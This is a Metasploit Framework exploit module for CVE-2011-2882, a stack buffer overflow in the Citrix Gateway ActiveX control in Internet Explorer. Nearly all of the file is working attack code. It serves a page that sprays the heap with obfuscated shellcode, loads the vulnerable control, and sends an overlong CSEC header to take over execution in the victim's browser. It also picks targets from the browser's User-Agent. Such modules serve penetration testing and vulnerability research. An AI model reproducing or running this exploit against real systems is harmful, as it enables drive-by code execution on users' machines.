# $Id: citrix_gateway_actx.rb 13670 2011-08-31 00:15:46Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Citrix Gateway ActiveX Control Stack Based Buffer Overflow Vulnerability&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack based buffer overflow in the Citrix Gateway
                ActiveX control. Exploitation of this vulnerability requires user interaction.
                The victim must click a button in a dialog to begin a scan. This is typical
                interaction that users should be accustom to.
 
                    Exploitation results in code execution with the privileges of the user who
                browsed to the exploit page.
                    },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Michal Trojnara&#039;, #Initial discovery
                    &#039;bannedit&#039;,
                    &#039;sinn3r&#039;,
                ],
            &#039;Version&#039;        => &#039;$Revision: 13670 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;,  &#039;2011-2882&#039;],
                    [ &#039;OSVDB&#039;, &#039;74191&#039;   ],
                    [ &#039;URL&#039;, &#039;https://labs.idefense.com/verisign/intelligence/2009/vulnerabilities/display.php?id=929&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 500,
                    &#039;BadChars&#039; => "\x00\x0a\x0d\x20\x3b\x81\x83\x88\x90",
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, {} ],
                    [ &#039;IE 6 on Windows XP SP3&#039;, { &#039;Ret&#039; => 0x0c0c0c0c } ],
                    [ &#039;IE 7 on Windows XP SP3&#039;, { &#039;Ret&#039; => 0x0c0c0b0b } ],
                    [ &#039;IE 7 on Windows Vista&#039;,  { &#039;Ret&#039; => 0x0c0c0b0b } ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Jul 14 2011&#039;, #Coordinated public disclosure according to iDefense
            &#039;DefaultTarget&#039;  => 0))
    end
 
    def exploit
        @ocx = ::File.read(::File.join(Msf::Config.install_root, &#039;data&#039;, &#039;exploits&#039;, &#039;CVE-2011-2882&#039;, &#039;nsepa.ocx&#039;))
        super
    end
 
    def get_target(request)
        t = target
        agent = request.headers[&#039;User-Agent&#039;]
 
        vprint_status("User-Agent: #{agent}")
 
        if t.name =~ /Automatic/
            if agent =~ /NT 5\.1/ and agent =~ /MSIE 6\.0/
                #Win XP + IE 6
                t = targets[1]
            elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7\.0/
                #Win XP + IE 7
                t = targets[2]
            elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7\.0/
                #Win Vista + IE7
                t = targets[2]
            elsif agent == &#039;nsepa&#039;
                #Citrix Access Gateway requesting /epaq
                t = agent
            else
                #Target not supported
                t = nil
            end
        end
 
        return t, agent
    end
 
    def on_request_uri(cli, request)
        @mytarget, agent = get_target(request) if @mytarget.nil?
        vprint_status("Client requested: #{request.uri}.")
 
        #Target not supported, will not go on
        if @mytarget.nil?
            print_error("Target not supported: #{agent}")
            send_not_found(cli)
            return
        end
 
        if request.uri.match(/nsepa/)
            print_status("Sending nsepa.ocx to #{cli.peerhost}")
            send_response(cli, @ocx, { &#039;Content-Type&#039; => &#039;application/binary&#039; })
            return
        end
 
        if request.uri.match(/epaq/)
            padding = rand_text_alpha(300)
 
            csec = "eepa_0_"
            csec << padding[0, 259]
            csec << [@mytarget.ret].pack(&#039;V*&#039;)
            csec << padding[0, 68]
 
            result = rand_text_alpha(1000)
            send_response(cli, rand_text_alpha(30), { &#039;CSEC&#039; => csec, &#039;RESULT&#039; => result } )
            @mytarget = nil
            return
        end
 
        # Re-generate the payload
        return if ((p = regenerate_payload(cli)) == nil)
 
        # payload in JS format
        code = Rex::Text.to_unescape(payload.encoded)
 
        #For debugging purposes: nops.substring(0,0x534) lands the payload exactly at 0x0c0c0c0c for IE6
        spray = <<-JS
        var heap_lib = new heapLib.ie(0x20000);
        var code = unescape("#{code}");
        var nops = unescape("%u0c0c%u0c0c");
 
        while (nops.length < 0x1000) nops += nops;
        var offset = nops.substring(0, 0x550);
        var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
 
        while (shellcode.length < 0x20000) shellcode += shellcode;
        var block = shellcode.substring(0, (0x10000-6)/2);
 
        heap_lib.gc();
 
        for (var i = 0; i < 0x6000; i++) {
            heap_lib.alloc(block);
        }
        JS
 
        spray = heaplib(spray)
        spray = ::Rex::Exploitation::JSObfu.new(spray)
        spray.obfuscate
 
        load = %Q|
        var d=document.getElementById("nsepadiv");
        if(d) {
            d.innerHTML=
            &#039;<object id="nsepa" classid="CLSID:181BCAB2-C89B-4E4B-9E6B-59FA67A426B5" &#039;+
            &#039;width=1px height=1px codebase="#{get_resource}/epa/nsepa.ocx#version=8,0,59,1">&#039; +
            &#039;<param name="cookie" value="0123456789abcdef0123456789abcdef">&#039;+
            &#039;<param name="location" value="&#039;+document.location+&#039;">&#039;+
            &#039;<param name="trace" value="DEBUG">&#039;+
            &#039;<param name="vip" value="255.255.255.255">&#039;+
            &#039;</object>&#039;;
        } else {
          alert(&#039;Internal Error&#039;);
        }
|
        # the ret slide gets executed via call [esi+45b]
        html = <<-EOS
        <html>
        <body>
        <div id="nsepadiv"></div>
        <script language="javascript">
        #{spray}
        #{load}
        </script>
        </body>
        </html>
        EOS
 
        html = html.gsub(/^\t\t/, &#039;&#039;)
 
        # we need to handle direct /epaq requests
        proc = Proc.new do |cli, req|
            on_request_uri(cli, req)
        end
 
        add_resource({&#039;Path&#039; => "/epaq", &#039;Proc&#039; => proc}) rescue nil
        print_status("Sending #{self.name} HTML to #{cli.peerhost}:#{cli.peerport}")
        send_response(cli, html, { &#039;Content-Type&#039; => &#039;text/html&#039; })
    end
end



